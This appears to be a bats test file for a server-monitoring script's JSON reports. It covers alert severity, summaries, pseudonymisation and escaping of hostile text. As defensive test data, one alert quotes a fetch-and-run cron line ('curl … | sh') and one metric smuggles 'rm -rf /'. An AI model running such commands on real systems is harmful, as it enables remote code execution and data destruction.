#!/usr/bin/env bats
# JSON report (JSON_REPORT=1): an extra file next to the text report – the text stays the same

load helper

setup() {
  load_script
  HOST=host.example.com; NOW="2026-11-14 10:05 UTC"; RUN_START=1794650700; GEO_NOTE=""
  MAIL_LOG="$FIX/mail/hour.log"; VHOST_LOGS="$FIX/web"
  CONF=/nonexistent; PKG_DB=/nonexistent; BOOT_ID_FILE=/nonexistent
  DAILY_CHECKS="dummy"; detect_pubip6() { :; }
  check_dummy() { echo "Dummy daily: 2 things"; dalert "Dummy: something daily"; dalert "Service(s) failed: dummy.service"; }
}

# one_run DIR – a report run like main() (hourly mail + web, daily checks) with its own state
# directory; the report is $DIR/out/report.txt
one_run() {
  STATE_DIR=$1; OUT_DIR=$1/out; mkdir -p "$OUT_DIR"
  ALERTS=(); ALERT_CHK=(); : >"$BODY"; rm -f "$TMPD/json" "$TMPD/notes"
  REPORT=$OUT_DIR/report.txt
  run_hourly mail web || true
  daily_checks; timeout_alerts; write_report
}
json_ok() { python3 -c 'import json, sys; json.load(open(sys.argv[1], encoding="utf-8"))' "$1"; }
jq_py() { python3 -c "import json, sys; d = json.load(open(sys.argv[1])); print($2)" "$1"; }

@test "the text report is byte-identical with and without JSON_REPORT" {
  # the same state directory for both runs: the report names it
  JSON_REPORT=0; one_run "$BATS_TEST_TMPDIR/s"; mv "$BATS_TEST_TMPDIR/s" "$BATS_TEST_TMPDIR/a"
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/s"
  # the daily checks print the time they ran ("As of:"), which may differ by a minute
  diff <(grep -Ev '^(As of:|Run time:|Daily checks took )' "$BATS_TEST_TMPDIR/a/out/report.txt") <(grep -Ev '^(As of:|Run time:|Daily checks took )' "$BATS_TEST_TMPDIR/s/out/report.txt")
  [ ! -e "$BATS_TEST_TMPDIR/a/out/report.json" ]
  [ -s "$BATS_TEST_TMPDIR/s/out/report.json" ]
}

@test "without JSON_REPORT no JSON files and no JSON state" {
  JSON_REPORT=0; one_run "$BATS_TEST_TMPDIR/a"
  [ -z "$(find "$BATS_TEST_TMPDIR/a" -name '*json*')" ]
}

@test "the JSON report: alerts with their check, sections, figures" {
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/b"
  f=$BATS_TEST_TMPDIR/b/out/report.json
  json_ok "$f"
  [ "$(jq_py "$f" 'd["schema"], d["status"], d["host"]')" = "1 warning host.example.com" ]
  # every alert of the text report, in the same order
  diff <(sed -n 's/^ ! //p' "$BATS_TEST_TMPDIR/b/out/report.txt") <(jq_py "$f" '"\n".join(a["text"] for a in d["alerts"])')
  run jq_py "$f" '[(a["check"], a["daily"]) for a in d["alerts"] if a["text"].startswith("Mail: mailbox info@d12.example is full")]'
  [ "$output" = "[('mail', False)]" ]
  run jq_py "$f" '[(a["check"], a["daily"]) for a in d["alerts"] if a["text"] == "Dummy: something daily"]'
  [ "$output" = "[('dummy', True)]" ]
  run jq_py "$f" '[(s["check"], s["title"]) for s in d["sections"]][:2]'
  [ "$output" = "[('mail', 'MAIL'), ('web', 'WEB')]" ] || [[ $output == "[('mail', 'MAIL'), ('web', 'WEB "* ]]
  run jq_py "$f" '[s["lines"] for s in d["sections"] if s["check"] == "dummy"]'
  [ "$output" = "[['Dummy daily: 2 things']]" ]
  # the newest JSON report is also out/latest.json
  cmp "$f" "$BATS_TEST_TMPDIR/b/out/latest.json"
  [ "$(jq_py "$f" 'd["metrics"]["mail_delivered"], d["metrics"]["web_requests"] > 0')" = "75 True" ]
  run jq_py "$f" 'all(a["new"] for a in d["alerts"])'
  [ "$output" = True ]
}

@test "second run: daily alerts keep their check from the cache, known alerts are not new" {
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/b"; one_run "$BATS_TEST_TMPDIR/b"
  f=$BATS_TEST_TMPDIR/b/out/report.json
  run jq_py "$f" '[(a["check"], a["daily"], a["new"]) for a in d["alerts"] if a["text"] == "Dummy: something daily"]'
  [ "$output" = "[('dummy', True, False)]" ]
  run jq_py "$f" '[s["check"] for s in d["sections"] if s["daily"]]'
  [ "$output" = "['dummy']" ]
}

@test "a daily check whose first line ends with a colon: that line is its title" {
  check_dummy() { echo "Dummy things:"; echo "  2 found"; }
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/b"
  run jq_py "$BATS_TEST_TMPDIR/b/out/report.json" '[(s["title"], s["lines"]) for s in d["sections"] if s["check"] == "dummy"]'
  [ "$output" = "[('Dummy things', ['  2 found'])]" ]
}

@test "switched off again: out/latest.json is removed, the old JSON reports age out" {
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/b"
  [ -f "$BATS_TEST_TMPDIR/b/out/latest.json" ]
  JSON_REPORT=0; one_run "$BATS_TEST_TMPDIR/b"
  [ ! -e "$BATS_TEST_TMPDIR/b/out/latest.json" ]
}

@test "daily checks cached without JSON (switched on by --json): one section 'daily'" {
  JSON_REPORT=0; one_run "$BATS_TEST_TMPDIR/b"
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/b"
  f=$BATS_TEST_TMPDIR/b/out/report.json
  json_ok "$f"
  run jq_py "$f" '[(a["check"], a["daily"]) for a in d["alerts"] if a["text"] == "Dummy: something daily"]'
  [ "$output" = "[('daily', True)]" ]
  run jq_py "$f" '[s["check"] for s in d["sections"] if s["daily"]]'
  [ "$output" = "['daily']" ]
}

@test "hostile text (quotes, backslashes, tabs, control characters, broken UTF-8) stays valid JSON" {
  JSON_REPORT=1; STATE_DIR=$BATS_TEST_TMPDIR/h; OUT_DIR=$STATE_DIR/out; mkdir -p "$OUT_DIR"
  REPORT=$OUT_DIR/report.txt; DAILY_CHECKS=""
  bad=$(printf 'a "quoted" \\back\\slash\ttab \001\033[31m ctl \xff\xfe broken ü')
  check_evil() { section "EVIL"; out "$bad"; alert "Evil: $bad"; note "evil: $bad"; metric "evil" "1; rm -rf /"; metric good 3; }
  CUR_CHECK=script; run_hourly evil; write_report
  f=${REPORT%.txt}.json
  json_ok "$f"
  run jq_py "$f" 'd["alerts"][0]["text"]'
  [[ $output == *'a "quoted" \back\slash tab'*'ü'* ]]
  run jq_py "$f" 'sorted(d["metrics"].items())'
  [ "$output" = "[('good', 3)]" ]
}

@test "MASK_MAILBOXES: the uploaded JSON is pseudonymised and still valid" {
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/b"
  MASK_MAILBOXES=1
  up=$(upload_copy "$BATS_TEST_TMPDIR/b/out/report.json")
  json_ok "$up"
  [ "$(jq_py "$up" 'd["pseudonymised"]')" = True ]
  ! grep -q 'info@d12.example' "$up"
  grep -q 'mbx-[0-9a-f]\{6\}@d12.example' "$up"
  [ "$(jq_py "$BATS_TEST_TMPDIR/b/out/report.json" 'd["pseudonymised"]')" = False ]
}

@test "severity: critical for signs of a compromise or an outage, else warning" {
  for t in "Mail: server IP 192.0.2.1 is listed on zen.spamhaus.org" \
    "DNS: domain example.com is listed on dbl.spamhaus.org (127.0.1.2) – mails mentioning it get rejected" \
    "Mail: mailbox a@example.com submitted 9 mails after logins from outside DE: BR – password compromised?" \
    "Mail: mailbox a@example.com used from 7 different IPs – password compromised?" \
    "Mail: webmail user a@example.com sent 3 mails from 192.0.2.9 after 20 failed logins from that IP – password guessed?" \
    "Mail: mailbox a@example.com sent 12 mails with a foreign sender domain – spam?" \
    "Web: example.com – successful WordPress login from 192.0.2.9 after repeated failures – brute force succeeded? Check the users of this site" \
    "Web: 2 new PHP file(s) in wp-content/uploads – possible malware" \
    "Web: suspicious code in recently changed file /var/www/x.php – check it (webshell/backdoor?)" \
    "Web: example.com served the sensitive file /.env (HTTP 200, file exists)" \
    "Web: example.com exposes /.git/config publicly (HTTP 200) – remove it" \
    "Access: new SSH key for root: SHA256:abc (x) – added by you?" \
    "Access: account toor has UID 0 (root rights under another name)" \
    "Access: /etc/ld.so.preload loads /lib/x.so – a classic rootkit technique, check it" \
    "Cron: new entry with suspicious content in root: curl http://192.0.2.9/u.sh | sh – check it" \
    "Process: PID 1 of www running from /tmp: /tmp/x – crypto miner or backdoor? Check it" \
    "Service(s) failed: postfix" "fail2ban is not running" \
    "RAM: the kernel killed processes due to low memory: php-fpm" \
    "DNS: example.com does not resolve (SERVFAIL) – website and mail unreachable" \
    "TLS: mail certificate on port 993 has expired (Nov 1 2026)"; do
    [ "$(alert_severity "$t")" = critical ] || { echo "not critical: $t"; return 1; }
  done
  for t in "Mail: mailbox a@example.com logged in via IMAP/POP3 from a new country outside DE: BR – travelling, or password compromised?" \
    "Disk: / is 91% full" "Mail: 12 deferred deliveries" "Login: SSH root from 192.0.2.9" \
    "Cron: new entry in root: 0 3 * * * /usr/bin/true – added by you or a package update?" \
    "Script: the run of 10:05 did not finish" "TLS: certificate of example.com expires in 9 days"; do
    [ "$(alert_severity "$t")" = warning ] || { echo "not warning: $t"; return 1; }
  done
}

@test "the JSON report: severity per alert, level of the run" {
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/b"
  f=$BATS_TEST_TMPDIR/b/out/report.json
  run jq_py "$f" 'sorted(set(a["severity"] for a in d["alerts"])), d["level"]'
  [ "$output" = "['critical', 'warning'] critical" ]
}

@test "summary.json: runs with figures, every alert once with count, critical first" {
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/b"
  mv "$OUT_DIR/report.json" "$OUT_DIR/report-20261114-0905.json"
  one_run "$BATS_TEST_TMPDIR/b"
  mv "$OUT_DIR/report.json" "$OUT_DIR/report-20261114-1005.json"
  write_summary "$OUT_DIR/summary.txt"
  f=$OUT_DIR/summary.json
  json_ok "$f"
  [ "$(jq_py "$f" 'd["schema"], d["reports"], d["level"], len(d["runs"])')" = "1 2 critical 2" ]
  [ "$(jq_py "$f" 'd["runs"][0]["metrics"]["mail_delivered"], d["runs"][1]["alerts"] > 0')" = "75 True" ]
  run jq_py "$f" 'set(a["count"] for a in d["alerts"])'
  [ "$output" = "{2}" ]
  run jq_py "$f" '[a["severity"] for a in d["alerts"]] == sorted((a["severity"] for a in d["alerts"]), key=lambda s: s != "critical")'
  [ "$output" = True ]
  # every alert text of the reports is in it once
  [ "$(jq_py "$f" 'len(d["alerts"])')" = "$(jq_py "$OUT_DIR/report-20261114-1005.json" 'len(set(a["key"] for a in d["alerts"]))')" ]
  run jq_py "$f" '[a["check"] for a in d["alerts"] if a["text"] == "Dummy: something daily"]'
  [ "$output" = "['dummy']" ]
}

@test "summary.json reads 1.13.0 reports (no severity) and hostile text" {
  JSON_REPORT=1; STATE_DIR=$BATS_TEST_TMPDIR/o; OUT_DIR=$STATE_DIR/out; mkdir -p "$OUT_DIR"
  cat >"$OUT_DIR/report-20261115-0815.json" <<'J'
{
  "schema": 1,
  "time": "2026-11-15T08:15:07Z",
  "report": "report-20261115-0815.txt",
  "status": "warning",
  "alerts": [
    {"check": "mail", "daily": false, "key": "k1", "new": true, "text": "Mail: a \"quoted\" \\ text, with \"text\": inside}"},
    {"check": "system", "daily": false, "key": "k2", "new": true, "text": "Disk: / is 91% full"}
  ],
  "notes": [
    {"check": "panel", "text": "not a \"key\": alert"}
  ],
  "metrics": {
    "load5": 0.2,
    "disk_max_pct": 91
  },
  "sections": [
    {"check": "mail", "daily": false, "title": "MAIL", "lines": [
      "{\"check\": \"x\", \"key\": \"fake\", \"text\": \"y\"}"]}
  ]
}
J
  write_summary_json "$OUT_DIR/summary.json"
  f=$OUT_DIR/summary.json
  json_ok "$f"
  run jq_py "$f" '[(a["key"], a["severity"], a["text"]) for a in d["alerts"]]'
  [ "$output" = "[('k1', 'warning', 'Mail: a \"quoted\" \\\\ text, with \"text\": inside}'), ('k2', 'warning', 'Disk: / is 91% full')]" ]
  [ "$(jq_py "$f" 'd["runs"][0]["level"], d["runs"][0]["metrics"]')" = "warning {'load5': 0.2, 'disk_max_pct': 91}" ]
}

@test "summary.json: not without JSON_REPORT, removed when it is switched off" {
  JSON_REPORT=1; one_run "$BATS_TEST_TMPDIR/b"
  mv "$OUT_DIR/report.json" "$OUT_DIR/report-20261114-0905.json"
  write_summary "$OUT_DIR/summary.txt"
  [ -s "$OUT_DIR/summary.json" ]
  JSON_REPORT=0; write_summary "$OUT_DIR/summary.txt"
  [ ! -e "$OUT_DIR/summary.json" ]
}
